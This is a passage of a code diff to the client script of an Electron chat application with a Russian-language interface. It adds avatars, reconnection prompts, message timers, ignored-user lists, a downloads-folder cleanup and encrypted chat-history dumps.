+                color: message.color
+            });
+        }
+        scroll();
+    }).bind(user));
+    roomSocket.on(`close`, async (code, reason) => {
+        for (const fileId in user.files) {
+            if (user.files[fileId].writeStream) {
+                user.files[fileId].writeStream.end();
+            }
+        }
+        if (code == 1006) {
+            showErrorModal(`Вы отключены из комнаты ${user.room.name} по причине потери подключения к серверу!`);
+        } else if (code == 4001) {
+            showErrorModal(`Вы забанены в комнате ${user.room.name} !`);
+            await user.disconnect();
+        }
+        if (user.room && ![4000, 4001].includes(code)) {
+            const oldRoom = user.room;
+            await user.disconnect();
+            const reconnect = await swal({
+                title: `Переподключение`,
+                text: `Переподключиться к комнате ${oldRoom.name} ?`,
+                buttons: ["Нет", "Да"],
+                icon: "warning",
+            });
+            if (reconnect) {
+                await connectToTheRoom(oldRoom.password, oldRoom._id, oldRoom.color, oldRoom.name);
+            }
+        } else {
+            await user.disconnect();
+        }
+    });
+    createFileWebSocket(room);
+    user.roomSocket = roomSocket;
+    user.room = room;
+    getElem(`message`).style.display = `flex`;
+    animate({
+        timing: makeEaseOut(circAnimateFunc),
+        draw(progress) {
+            elements.chat.style.gridTemplateRows = `minmax(18px, 3vh) ${100 - 20 * progress}vh 3vh 11vh 5vh`;
+        },
+        duration: 200
+    });
     elements.titleText.innerHTML = `<span class="header" data-title='Нажмите для отображения участников комнаты' style="color: ${color}">${name}</span>`;
     document.getElementsByClassName(`header`)[0].addEventListener(`click`, () => {
         showUsersInRoom();
     });
-    return logIn;
+    let {roomUsersIds} = await requestPostAsync({
+        url: `${server}/getUsersIdsInRoom`,
+        form: {
+            data: await getDataProperty({
+                password,
+                _id,
+            }),
+            _id: user._id
+        }
+    });
+    if (!roomUsersIds) {
+        return;
+    }
+    roomUsersIds = await getDecryptedData(roomUsersIds);
+    for (let i = 0; i < roomUsersIds.length; i++) {
+        if (roomUsersIds[i] == user._id) {
+            continue;
+        }
+        let {userAvatar} = await requestPostAsync({
+            url: `${server}/getUserAvatar`,
+            form: {
+                data: await getDataProperty({
+                    password,
+                    _id,
+                    userId: roomUsersIds[i]
+                }),
+                _id: user._id
+            }
+        });
+        if (!userAvatar) {
+            continue;
+        }
+        userAvatar = await getDecryptedData(userAvatar);
+        user.cachedAvatars[roomUsersIds[i]] = userAvatar;
+    }
 };
 
 const checkPasswordRoom = async (password, _id) => {
@@ -574,8 +1137,8 @@ const checkPasswordRoom = async (password, _id) => {
             data: await getDataProperty({
                 password,
                 _id,
-                check: `true`
-            }, user.aesKeyBytes),
+                check: true
+            }),
             _id: user._id
         }
     });
@@ -591,7 +1154,7 @@ const showRooms = async () => {
     if (!answer) {
         return;
     }
-    rooms = JSON.parse(decryptAES(answer, user.aesKeyBytes));
+    rooms = await getDecryptedData(answer);
     let r = ``;
     for (let roomId in rooms) {
         const room = rooms[roomId];
@@ -609,79 +1172,80 @@ const showRooms = async () => {
         </tr>`;
     }
     elements.rooms.innerHTML = `${defaultServers}${r}</tbody>`;
-    [...document.getElementsByClassName(`room`)].forEach(e => {
-        e.addEventListener(`click`, function () {
-            const _id = this.getAttribute(`roomId`);
-            if (user.room && user.room._id == _id) {
-                return showErrorModal(`Вы уже находитесь в этой комнате!`);
-            }
-            const roomData = rooms[_id];
-            const {
-                color
-            } = roomData;
-            if (!roomData.passwordProtected) {
-                swal({
-                    title: `Подключение к комнате ${roomData.name}`,
-                    text: `Данная комната не запаролена. Подключиться к ней?`,
-                    buttons: ["Отмена", "Подключиться"]
-                }).then(async result => {
-                    if (result) {
-                        let auth = await checkPasswordRoom(``, _id);
-                        if (auth.logIn) {
-                            if (user.room) {
-                                await user.disconnect();
-                            }
-                            await connectToTheRoom(``, _id, color, roomData.name);
-                        } else {
-                            if (auth.banned) {
-                                showErrorModal(`Вы забанены в этой комнате!`);
-                            } else if (auth.multi) {
-                                showErrorModal(`Вы уже есть в этой комнате в одном из окон!`);
-                            } else {
-                                showErrorModal(`Комнаты не существует!`);
-                            }
-                        }
-                    }
-                });
-            } else {
-                swal({
-                    title: `Подключение к комнате ${roomData.name}`,
-                    text: "Введите пароль для подтверждения",
-                    content: {
-                        element: "input",
-                        attributes: {
-                            type: "password",
-                        },
-                    },
-                    buttons: ["Отмена", "Подключиться"],
-                }).then(async password => {
-                    if (typeof password == `string`) {
-                        password = hashPassword(password);
-                        let r = await checkPasswordRoom(password, _id);
-                        if (r.logIn) {
-                            if (user.room) {
-                                await user.disconnect();
-                            }
-                            await connectToTheRoom(password, _id, color, roomData.name);
-                        } else {
-                            if (r.banned) {
-                                showErrorModal(`Вы забанены в этой комнате!`);
-                            } else if (auth.multi) {
-                                showErrorModal(`Вы уже есть в этой комнате в одном из окон!`);
-                            } else {
-                                showErrorModal(`Неправильный пароль!`);
-                            }
-                        }
-                    }
-                });
-            }
-        });
-    });
     return true;
 };
 
-let user = {}; //объект пользователя
+let user; //объект пользователя
 let rooms;
+
+elements.rooms.addEventListener('click', async e => {
+    const tr = e.target.closest('.room');
+    if (!tr) {
+        return;
+    }
+    const _id = tr.getAttribute(`roomId`);
+    if (user.room && user.room._id == _id) {
+        return showErrorModal(`Вы уже находитесь в этой комнате!`);
+    }
+    const roomData = rooms[_id];
+    const {
+        color
+    } = roomData;
+    if (!roomData.passwordProtected) {
+        const result = await swal({
+            title: `Подключение к комнате ${roomData.name}`,
+            text: `Данная комната не запаролена. Подключиться к ней?`,
+            buttons: ["Отмена", "Подключиться"]
+        });
+        if (result) {
+            let auth = await checkPasswordRoom(``, _id);
+            if (auth.logIn) {
+                if (user.room) {
+                    await user.disconnect();
+                }
+                await connectToTheRoom(``, _id, color, roomData.name);
+            } else {
+                if (auth.banned) {
+                    showErrorModal(`Вы забанены в этой комнате!`);
+                } else if (auth.multi) {
+                    showErrorModal(`Вы уже есть в этой комнате в одном из окон!`);
+                } else {
+                    showErrorModal(`Комнаты не существует!`);
+                }
+            }
+        }
+    } else {
+        let password = await swal({
+            title: `Подключение к комнате ${roomData.name}`,
+            text: "Введите пароль для подтверждения",
+            content: {
+                element: "input",
+                attributes: {
+                    type: "password",
+                },
+            },
+            buttons: ["Отмена", "Подключиться"],
+        });
+        if (typeof password == `string`) {
+            password = hashPassword(password);
+            let r = await checkPasswordRoom(password, _id);
+            if (r.logIn) {
+                if (user.room) {
+                    await user.disconnect();
+                }
+                await connectToTheRoom(password, _id, color, roomData.name);
+            } else {
+                if (r.banned) {
+                    showErrorModal(`Вы забанены в этой комнате!`);
+                } else if (r.multi) {
+                    showErrorModal(`Вы уже есть в этой комнате в одном из окон!`);
+                } else {
+                    showErrorModal(`Неправильный пароль!`);
+                }
+            }
+        }
+    }
+});
 
 elements.connectToTheHiddenRoom.addEventListener(`click`, () => {
     swal({
@@ -699,13 +1263,14 @@ elements.connectToTheHiddenRoom.addEventListener(`click`, () => {
             if (user.room && user.room._id == roomId) {
                 return showErrorModal(`Вы уже находитесь в этой комнате!`);
             }
-            const data = JSON.parse(decryptAES((await requestPostAsync({
+            const checkRespone = await requestPostAsync({
                 url: `${server}/checkHiddenRoom`,
                 form: {
-                    data: encryptAES(roomId, user.aesKeyBytes),
+                    data: await getDataProperty({roomId}),
                     _id: user._id
                 }
-            })).data, user.aesKeyBytes));
+            });
+            const data = await getDecryptedData(checkRespone.data);
             if (data.logIn) {
                 if (user.room) {
                     await user.disconnect();
@@ -737,6 +1302,67 @@ document.addEventListener(`mousedown`, e => {
 //     }
 // });
 
+elements.selectAvatar.addEventListener('click', async () => {
+    const {
+        filePaths: [avatarPath]
+    } = await dialog.showOpenDialog(currentWindow, {
+        properties: [`openFile`]
+    });
+    if (avatarPath) {
+        try {
+            const img = await jimp.read(await fs.promises.readFile(avatarPath));
+            user.avatar = await img.resize(48, 48).getBase64Async(jimp.MIME_PNG);
+            avatarPreview.innerHTML = `<img src="${user.avatar}">`;
+            localStorage.avatar = user.avatar;
+        } catch (e) {
+            showErrorDialog('Содержимое файла не похоже на изображение!');
+        }
+    }
+});
+
+elements.loadAvatar.addEventListener('click', async () => {
+    if (user.avatar) {
+        const {success} = await requestPostAsync({
+            url: `${server}/loadUserAvatar`,
+            form: {
+                data: await getDataProperty(user.avatar),
+                _id: user._id
+            }
+        });
+        if (success) {
+            sendMessageToRoom({
+                action: 'changeAvatar',
+                newAvatar: user.avatar
+            });
+            showMessageBox('Аватар успешно загружен!');
+        } else {
+            showErrorDialog('Не удалось загрузить аватар на сервер. Попробуйте еще раз!');
+        }
+    } else {
+        showErrorDialog('Вы не выбрали аватар!');
+    }
+});
+
+elements.deleteAvatar.addEventListener('click', async () => {
+    if (user.avatar) {
+        delete user.avatar;
+        delete localStorage.avatar;
+        elements.avatarPreview.innerHTML = '';
+        const {success} = await requestPostAsync({
+            url: `${server}/loadUserAvatar`,
+            form: {
+                data: await getDataProperty(""),
+                _id: user._id
+            }
+        });
+        if (!success) {
+            showMessageBox('Аватар успешно удален!');
+        }
+    } else {
+        showErrorDialog('Нечего удалять!');
+    }
+});
+
 getElem(`updateFolder`).addEventListener(`click`, async () => {
     const [newFolder] = (await dialog.showOpenDialog(currentWindow, {
         defaultPath: hendrixdir,
@@ -759,6 +1385,18 @@ getElem(`folder`).addEventListener(`click`, () => {
     shell.openItem(hendrixdir);
 });
 
+elements.useNonStandardBackground.addEventListener('change', function(e) {
+    if (this.checked) {
+        user.messagesBackgroundColor = `#${elements.messagesBackgroundColor.value}`;
+    } else {
+        delete user.messagesBackgroundColor;
+    }
+});
+
+elements.messagesBackgroundColor.addEventListener('change', function(e) {
+    user.messagesBackgroundColor = `#${this.value}`;
+});
+
 elements.settings.addEventListener(`click`, () => {
     elements.settingsBlock.style.display = `block`;
     elements.curVolume.textContent = `${(elements.volume.value * 100).toFixed(0)}%`;
@@ -767,6 +1405,52 @@ elements.settings.addEventListener(`click`, () => {
         button: false
     });
     getElem(`downloads`).value = hendrixdir;
+});
+
+elements.showMessagesSettings.addEventListener('click', async () => {
+    elements.messagesSettings.style.display = `block`;
+    await swal({
+        content: elements.messagesSettings,
+        button: false
+    }, true);
+    swal({
+        content: elements.settingsBlock,
+        button: false
+    });
+});
+
+getElem(`clearAllDownloads`).addEventListener(`click`, async () => {
+    const paths = fs.readdirSync(hendrixdir).map(name => path.join(hendrixdir, name));
+    let deletedSize = 0;
+    for (let i = 0; i < paths.length; i++) {
+        const stat = fs.statSync(paths[i]);
+        if (stat.isFile()) {
+            deletedSize += stat.size;
+        }
+    }
+    const answer = await swal({
+        title: `Очистка папки загрузок`,
+        text: `Вы уверены, что хотите очистить папку загрузок? Будет освобождено ${(deletedSize / 1024 / 1024).toFixed(3)} Мб`,
+        buttons: [`Нет`, `Да`]
+    }, true);
+    if (answer) {
+        let deletedCount = 0;
+        for (let i = 0; i < paths.length; i++) {
+            const stat = fs.statSync(paths[i]);
+            if (stat.isFile()) {
+                fs.unlinkSync(paths[i]);
+                deletedCount++;
+            }
+        }
+        await swal({
+            text: `Успешно удалено ${deletedCount} файлов суммарным размером в ${(deletedSize / 1024 / 1024).toFixed(3)} Мб!`,
+            buttons: false
+        }, true);
+    }
+    swal({
+        content: elements.settingsBlock,
+        button: false
+    });
 });
 
 const getOneToOneSound = () => {
@@ -804,6 +1488,14 @@ new Promise(resolve => {
 
 const clearDataFlag = document.createElement(`input`);
 clearDataFlag.setAttribute(`type`, `checkbox`);
+const clearDataLabel = document.createElement('label');
+clearDataLabel.classList.add('switch');
+clearDataLabel.style.marginLeft = '5px';
+clearDataLabel.appendChild(clearDataFlag);
+const checkboxSpan = document.createElement('span');
+checkboxSpan.classList.add('slider');
+checkboxSpan.classList.add('round');
+clearDataLabel.appendChild(checkboxSpan);
 const closeWindowButton = document.createElement(`button`);
 closeWindowButton.textContent = `Закрыть это окно`;
 
@@ -817,7 +1509,7 @@ getElem(`exit-button`).addEventListener(`click`, () => {
     const delDataDiv = document.createElement(`div`);
     delDataDiv.className = `des`;
     delDataDiv.textContent = `Стереть локальные данные`;
-    delDataDiv.appendChild(clearDataFlag);
+    delDataDiv.appendChild(clearDataLabel);
     div.appendChild(delDataDiv);
     div.appendChild(closeWindowButton);
     swal({
@@ -868,13 +1560,18 @@ elements.servers.addEventListener(`mouseout`, () => {
     elements.serverMenu.style.opacity = 0;
 });
 
-elements.clear.addEventListener(`click`, () => {
-    elements.dialog.innerHTML = ``;
+elements.clear.addEventListener(`click`, async () => {
+    playSound(`sounds/clear.mp3`);
+    elements.dialog.childNodes.forEach(node => {
+        if (node.tagName == 'DIV') {
+            deleteElementWithAnimation(node);
+        }
+    });
+    await sleep(250);
     elements.dialog.dispatchEvent(new CustomEvent(`scroll`));
     user._dump = [];
     user._history = [];
     user._historyPos = -1;
-    playSound(`sounds/clear.mp3`);
 });
 
 let scrollCondPast;
@@ -926,8 +1623,6 @@ elements.dialog.addEventListener(`scroll`, function (e) {
     scrollCondPast = scrollCond;
 });
 
-let animationStep = 0.75;
-
 const animate = ({
     timing,
     draw,
@@ -935,6 +1630,7 @@ const animate = ({
     endAnimation = () => {}
 } = {}) => {
     const start = performance.now();
+    let onceEndAnimation = true;
     let requestId = requestAnimationFrame(function animate(time) {
         let timeFraction = (time - start) / duration;
         if (timeFraction > 1) timeFraction = 1;
@@ -942,12 +1638,13 @@ const animate = ({
         draw(progress);
         if (timeFraction < 1) {
             requestId = requestAnimationFrame(animate);
-        } else {
+        } else if (onceEndAnimation) {
             endAnimation();
+            onceEndAnimation = false;
         }
     });
     return () => cancelAnimationFrame(requestId);
-}
+};
 
 const makeEaseOut = timing => timeFraction => 1 - timing(1 - timeFraction);
 
@@ -996,12 +1693,12 @@ getElem(`showRoomModal`).addEventListener(`click`, async () => {
     if (answer) {
         const name = getElem(`roomName`).value;
         const hidden = elements.hidden.checked;
-        if (!testEncrypt(getElem(`roomPassword`).value, testKey) && !hidden) {
+        if (!testEncrypt(getElem(`roomPassword`).value, testCipher) && !hidden) {
             return showErrorModal(`Недопустимые символы в пароле!`);
         }
         const password = !getElem(`roomPassword`).value || hidden ? `` : hashPassword(getElem(`roomPassword`).value);
         const match = name.match(/\s+/);
-        if (!testEncrypt(name, testKey)) {
+        if (!testEncrypt(name, testCipher)) {
             showErrorModal(`Недопустимые символы в имени!`);
         } else if (!name.length) {
             showErrorModal(`Слишком короткое имя!`);
@@ -1024,7 +1721,7 @@ getElem(`showRoomModal`).addEventListener(`click`, async () => {
                         _id,
                         color,
                         hidden
-                    }, user.aesKeyBytes),
+                    }),
                     _id: user._id
                 }
             })).success;
@@ -1047,7 +1744,7 @@ const send = (async function () {
         lastL = 0;
         changeIcon(`audio`);
     }
-    const message = this.innerText;
+    const message = this.innerText.trim();
     const match = message.match(/\s+/);
     if (!message.length || match && match[0].length == message.length) {
         await showErrorModal(`Слишком пусто :C, мы не можем это отправить`);
@@ -1057,9 +1754,18 @@ const send = (async function () {
         return elements.inputMessage.focus();
     }
     delete user.lastPress;
-    user.publish({
-        message
-    });
+    const backgroundColor = user.messagesBackgroundColor;
+    let messageObj = { message };
+    if (backgroundColor) {
+        messageObj.backgroundColor = backgroundColor;
+    }
+    if (+elements.sendMessageTimer.value) {
+        setTimeout(() => {
+            sendMessageToRoom(messageObj);
+        }, elements.sendMessageTimer.value * 1000);
+    } else {
+        sendMessageToRoom(messageObj);
+    }
     const msgPos = user._history.indexOf(message);
     if (~msgPos) {
         user._history.splice(msgPos, 1);
@@ -1082,7 +1788,34 @@ const exitRoom = async () => {
     elements.inputMessage.blur();
 };
 
-getElem(`disconnect`).addEventListener(`click`, () => {
+const zeroChecker = function() {
+    if (+this.value < 0) {
+        this.value = 0;
+    }
+};
+
+elements.deletionMessageTimer.addEventListener('change', zeroChecker);
+
+elements.sendMessageTimer.addEventListener('change', zeroChecker);
+
+elements.saveListIgnoredUsers.addEventListener('click', async () => {
+    const encryptedListIgnoredUsers = await requestPostAsync({
+        url: `${server}/updateListIgoneredUsers`,
+        form: {
+            data: await getDataProperty(elements.listIgnoredUsers.value.match(/[\da-f]+/g)),
+            _id: user._id
+        }
+    });
+    const decryptedListIgnoredUsers = await getDecryptedData(encryptedListIgnoredUsers.data);
+    let ignoredUsersHTML = ``;
+    for (let i = 0; i < decryptedListIgnoredUsers.length; i++) {
+        const ignoredUser = decryptedListIgnoredUsers[i];
+        ignoredUsersHTML += `<pre class="des"><span class="user" style="font-weight: bold; color: ${ignoredUser.color}" onclick="copyText('${ignoredUser._id}')">${ignoredUser.name}</span></pre>`;
+    }
+    viewListIgnoredUsers.innerHTML = ignoredUsersHTML;
+});
+
+getElem(`disconnect`).addEventListener(`click`, async () => {
     if (!user.room) {
         return;
     }
@@ -1090,22 +1823,24 @@ getElem(`disconnect`).addEventListener(`click`, () => {
     if (dontRemind.checked) {
         return exitRoom();
     }
-    swal({
+    const answer = await swal({
         title: `Выход`,
         content: exitRoomBlock,
         buttons: ["Отмена", "Да"],
         icon: "warning",
-    }).then(answer => {
-        if (answer) {
-            exitRoom();
-        }
     });
+    if (answer) {
+        exitRoom();
+    }
 });
 
 const getMediaCallback = (type, ext, title, style) => {
     return async e => {
         const blob = e.data;
         const buf = await blobToBuffer(blob);
+        if (buf.length < 1000) {
+            return;
+        }
         const url = URL.createObjectURL(blob);
         const div = document.createElement(`div`);
         div.innerHTML = `<${type} src="${url}" controls ${style ? `style="${style}"` : ``}></${type}>`;
@@ -1113,7 +1848,7 @@ const getMediaCallback = (type, ext, title, style) => {
         saveButton.textContent = `Сохранить файл`;
         div.appendChild(saveButton);
         saveButton.addEventListener(`click`, async () => {
-            const {filePath} = await dialog.showSaveDialog({
+            const {filePath} = await dialog.showSaveDialog(currentWindow, {
                 defaultPath: await getRandomId(),
                 filters: [{
                     name: '',
@@ -1132,7 +1867,7 @@ const getMediaCallback = (type, ext, title, style) => {
             elements.inputMessage.focus();
             if (answer) {
                 filesSendCallbacksStack.push(async () => {
-                    await sendBuffer(await zlib.deflate(buf), ext);
+                    await sendBuffer(buf, ext);
                 });
             }
         });
@@ -1185,7 +1920,7 @@ const startScreenVideo = async () => {
     user.screenRecorder = true;
     const source = (await desktopCapturer.getSources({
         types: ['screen']
-    })).find(source => source.name == 'Entire screen' || source.name == `Screen 1`);
+    })).map(source => (source.name = source.name.toLowerCase(), source)).find(source => source.name == 'entire screen' || source.name == `Screen 1`);
     const {size} = screen.getPrimaryDisplay();
     const recorder = await getVideoRecorder({
         audio: {
@@ -1215,6 +1950,9 @@ const startScreenVideo = async () => {
 };
 
 const stopScreenVideo = () => {
+    if (typeof user.screenRecorder != 'object') {
+        return;
+    }
     user.screenRecorder.stop();
     user.screenRecorder.stream.getTracks().map(track => track.stop());
     delete user.screenRecorder;
@@ -1240,6 +1978,7 @@ const startWebcamVideo = async () => {
         return showErrorModal(`Ошибка: ${recorder.e}`);;
     }
     const videoEl = document.createElement(`video`);
+    videoEl.volume = 0;
     videoEl.srcObject = videoSource;
     videoEl.autoplay = true;
     videoEl.style.width = `350px`;
@@ -1255,6 +1994,9 @@ const startWebcamVideo = async () => {
 };
 
 const stopWebcamVideo = () => {
+    if (typeof user.webcamRecorder != 'object') {
+        return;
+    }
     user.webcamRecorder.stop();
     user.webcamRecorder.stream.getTracks().map(track => track.stop());
     delete user.webcamRecorder;
@@ -1270,12 +2012,32 @@ elements.webcamRec.addEventListener(`click`, () => {
 });
 
 const stopAudio = () => {
+    if (typeof recorder != 'object') {
+        return;
+    }
     changeIcon();
     delete user.audio;
     recorder.stop();
     recorder.stream.getTracks().map(track => track.stop());
     elements.audioRec.style.backgroundImage = `url(styles/audio.png)`;
 };
+
+elements.reconnect.addEventListener(`click`, async () => {
+    if (!user.room) {
+        return;
+    }
+    const reconnect = await swal({
+        title: `Переподключение`,
+        text: `Переподключиться к комнате ${user.room.name} ?`,
+        buttons: ["Нет", "Да"],
+        icon: "warning",
+    });
+    if (reconnect) {
+        const oldRoom = user.room;
+        await user.disconnect();
+        await connectToTheRoom(oldRoom.password, oldRoom._id, oldRoom.color, oldRoom.name);
+    }
+});
 
 elements.send.addEventListener(`click`, async () => {
     if (user.room && user.audio) {
@@ -1301,13 +2063,14 @@ getElem(`createDump`).addEventListener(`click`, async () => {
     if (!password) {
         return showErrorDialog(`Слишком короткий пароль`);
     }
-    password = hashPassword(password);
+    password = Buffer.from(hashPassword(password), `hex`);
+    const iv = password.slice(0, 16);
     const [dumpPath] = (await dialog.showOpenDialog(currentWindow, {
         defaultPath: hendrixdir,
         properties: [`openDirectory`]
     })).filePaths;
     if (dumpPath) {
-        const data = Buffer.from(encryptAES((await zlib.deflate(JSON.stringify(user._dump))).toString(encoding), password), encoding);
+        const data = encryptAES(await zlib.deflate(JSON.stringify(user._dump)), password, iv);
         const curDate = new Date();
         await fs.writeFile(`${dumpPath}${path.sep}${await getRandomId(3)}_${curDate.getDate().toString().padStart(2, `0`)}-${(curDate.getMonth() + 1).toString().padStart(2, `0`)}-${curDate.getFullYear()}_${await getRandomId(3)}.hdmp`, data);
     }
@@ -1327,10 +2090,11 @@ getElem(`loadDump`).addEventListener(`click`, async () => {
         if (!password) {
             return showErrorDialog(`Слишком короткий пароль`);
         }
-        password = hashPassword(password);
+        password = Buffer.from(hashPassword(password), `hex`);
+        const iv = password.slice(0, 16);
         const data = await fs.readFile(file);
         try {
-            const dump = JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, password), encoding)));
+            const dump = JSON.parse(await zlib.unzip(decryptAES(data, password, iv)));
             elements.dialog.innerHTML = ``;
             for (let i = 0; i < dump.length; i++) {
                 const message = dump[i];
@@ -1346,7 +2110,7 @@ getElem(`loadDump`).addEventListener(`click`, async () => {
                 const seconds = date.getSeconds().toString();
                 let nameBlock;
                 if (message.user) {
-                    nameBlock = `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>`;
+                    nameBlock = `<span onclick="copyText('${message.user}')" class="user" style="color:${message.color}">${message.name}</span>`;
                 } else {
                     nameBlock = message.name;
                 }
@@ -1376,9 +2140,17 @@ getElem(`loadDump`).addEventListener(`click`, async () => {
                     } else {
                         msg = `<span class="readyFile"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span><img onclick="openFileWithDefaultProgram('${fileId}')" class="launchImage" src="styles/start.png" class="launcIcon"></span>`;
                     }
-                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, msg));
+                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock({
+                        nameBlock: `${nameBlock}${additional}`,
+                        date: `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`,
+                        message: msg
+                    }));
                 } else {
-                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, message.message));
+                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock({
+                        nameBlock: `${nameBlock}${additional}`,
+                        date: `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`,
+                        message: message.message
+                    }));
                 }
             }
         } catch (e) {
@@ -1391,9 +2163,7 @@ elements.inputMessage.addEventListener(`input`, () => {
     const curDate = new Date();
     if (curDate - user.lastPress >= 3000 || !user.lastPress) {
         user.lastPress = curDate;
-        user.publish({
-            typing: true
-        });
+        sendMessageToRoom({action: 'typing'});
     }
 })
 
@@ -1403,7 +2173,7 @@ const changeHistoryPos = {
 };
 
 elements.inputMessage.addEventListener(`keydown`, function (e) {
-    if (!(e.ctrlKey && e.key.match(/[vм]/i))) {
+    if (!(e.ctrlKey && /[vм]/i.test(e.key))) {
         const sel = getSelection();
         curPastePos = sel.anchorOffset;
         curAnchorNodeLength = sel.anchorNode.length || 0;
@@ -1414,6 +2184,14 @@ elements.inputMessage.addEventListener(`keydown`, function (e) {
         e.preventDefault();
         this.innerHTML = user._history[user._historyPos];
     }
+    if (e.ctrlKey && /[eу]/i.test(e.key)) {
+        try {
+            const expression = this.innerText.match(/[0-9()*+/-\s\.]+/g).join('');
+            if (expression) {
+                this.innerHTML = eval(expression);
+            }
+        } catch  (e) { }
+    }
     if (e.key == `Enter` && !e.shiftKey) {
         e.preventDefault();
         send();
@@ -1422,7 +2200,8 @@ elements.inputMessage.addEventListener(`keydown`, function (e) {
     }
 });
 let curPastePos, curAnchorNodeLength;
-elements.inputMessage.addEventListener(`paste`, function (e) {
+
+const pasteInputHandler = function (e) {
     e.preventDefault();
     document.execCommand(`insertHTML`, false, e.clipboardData.getData(`text/plain`).replace(/\n/g, `<br>`));
     for (let childNone of this.childNodes) {
@@ -1440,7 +2219,9 @@ elements.inputMessage.addEventListener(`paste`, function (e) {
     range.collapse(true);
     sel.removeAllRanges();
     sel.addRange(range);
-});
+};
+
+elements.inputMessage.addEventListener(`paste`, pasteInputHandler);
 
 let lastL;
 
@@ -1471,9 +2252,11 @@ const waitWriteStream = WriteStream => new Promise(res => {
     WriteStream.on(`finish`, () => res(true));
 });
 
-const getMessageBlock = (color, nameBlock, date, message, backgroundClr) => `
-    <div class="messageBlock" ${backgroundClr ? `style="background-color: ${backgroundClr}"` : ``}>
-        <div class="name" style="color:${color}">
+const getMessageBlock = ({nameBlock, date, message, backgroundClr, messageId = '', userId, backgroundImg} = {}) => {
+    return `
+    <div class="messageBlock textMsg" ${backgroundClr ? `style="background-color: ${backgroundClr}"` : ``} messageid="${messageId}" userid="${userId}">
+        <div class="avatar"><img class="imgAvatar" src="${backgroundImg || defaultAvatar}"></div>
+        <div class="name">
             ${nameBlock}
         </div>
         <div class="date">
@@ -1482,10 +2265,15 @@ const getMessageBlock = (color, nameBlock, date, message, backgroundClr) => `
         <pre class="message">${message}</pre>
     </div>
 `;
+};
 
-const createMessageBlock = (color, name, date) => {
+const createMessageBlock = (color, name, date, messageId = '', userId = '', fileId = '', backgroundImg) => {
     const messageBlock = document.createElement(`div`);
+    messageBlock.setAttribute('messageid', messageId);
+    messageBlock.setAttribute('userid', userId);
+    messageBlock.setAttribute('fileid', fileId);
     messageBlock.classList.add(`messageBlock`);
+    messageBlock.classList.add(`fileMsg`);
     const nameBlock = document.createElement(`div`);
     nameBlock.style.color = color;
     nameBlock.innerHTML = name;
@@ -1504,6 +2292,13 @@ const createMessageBlock = (color, name, date) => {
     fileBlock.appendChild(fileProgress);
     fileBlock.appendChild(launchIcon);
     msg.appendChild(fileBlock);
+    const avatarBlock = document.createElement('div');
+    avatarBlock.classList.add('avatar');
+    const imgAvatarBlock = document.createElement('img');
+    imgAvatarBlock.classList.add('imgAvatar');
+    imgAvatarBlock.src = backgroundImg || defaultAvatar;
+    avatarBlock.appendChild(imgAvatarBlock);
+    messageBlock.appendChild(avatarBlock);
     messageBlock.appendChild(nameBlock);
     messageBlock.appendChild(dateBlock);
     messageBlock.appendChild(msg);
@@ -1655,7 +2450,9 @@ getElem(`next`).addEventListener(`click`, async function (e) {
     e.preventDefault();
     let name = getElem(`name`).value;
     const match = name.match(/\s+/);
-    if (!testEncrypt(name, testKey)) {
+    const ip = elements.serverIp.value;
+    const port = elements.serverPort.value;
+    if (!testEncrypt(name, testCipher)) {
         showErrorModal(`Недопустимые символы`);
     } else if (!name.length) {
         showErrorModal(`Слишком короткое имя`);
@@ -1663,11 +2460,30 @@ getElem(`next`).addEventListener(`click`, async function (e) {
         showErrorModal(`Слишком длинное имя`);
     } else if (match && match[0].length == name.length) {
         showErrorModal(`Имя не может быть только из пробелов!`);
+    } else if (!net.isIPv4(ip)) {
+        showErrorModal(`Некорректный ip!`);
+    } else if (!Number.isInteger(+port) || parseInt(port) < 0 || parseInt(port) >= 2 ** 16) {
+        showErrorModal(`Некорректный порт!`);
     } else {
+        server = `http://${ip}:${port}`;
+        const versionCheck = await requestPostAsync({
+            url: `${server}/check`,
+            form: {
+                version: remote.app.getVersion()
+            }
+        }, true);
+        if (!versionCheck) {
+            return;
+        }
+        localStorage.ip = ip;
+        localStorage.port = port;
+        ipcRenderer.send(`serverSend`, server);
         const userObj = {
             _history: [],
+            roomsHistory: {},
             _historyPos: -1,
             files: {},
+            cachedAvatars: {},
             showNotifications: true,
             _dump: [],
             async subNotifications(canceled) {
@@ -1680,14 +2496,15 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                 let notification = await requestPostAsync({
                     url: `${server}/subNotifications`,
                     form: {
-                        data: encryptAES(JSON.stringify(obj), this.aesKeyBytes),
+                        data: await getDataProperty(obj, this),
                         _id: this._id
                     }
                 });
                 if (!notification) {
+                    await sleep(1000);
                     return setImmediate(this.subNotifications);
                 }
-                notification = JSON.parse(decryptAES(notification.data, this.aesKeyBytes));
+                notification = await getDecryptedData(notification.data, this);
                 const div = document.createElement(`div`);
                 div.innerHTML = notification.message;
                 const answer = await swal({
@@ -1698,198 +2515,25 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                     if (this.room) {
                         await this.disconnect();
                     }
-                    await connectToTheRoom(notification.password, notification._id, notification.color, notification.name);
+                    let auth = await checkPasswordRoom(notification.password, notification._id);
+                    if (auth.banned) {
+                        showErrorModal(`Вы забанены в этой комнате!`);
+                        return setImmediate(this.subNotifications, {
+                            _id: notification._id
+                        });
+                    } else if (auth.multi) {
+                        showErrorModal(`Вы уже есть в этой комнате в одном из окон!`);
+                        return setImmediate(this.subNotifications, {
+                            _id: notification._id
+                        });
+                    } else {
+                        await connectToTheRoom(notification.password, notification._id, notification.color, notification.name);
+                    }
                     setImmediate(this.subNotifications);
                 } else {
                     setImmediate(this.subNotifications, {
                         _id: notification._id
                     });
-                }
-            },
-            async subscribe() {
-                if (!this.room) {
-                    return;
-                }
-                let message = await requestPostAsync({
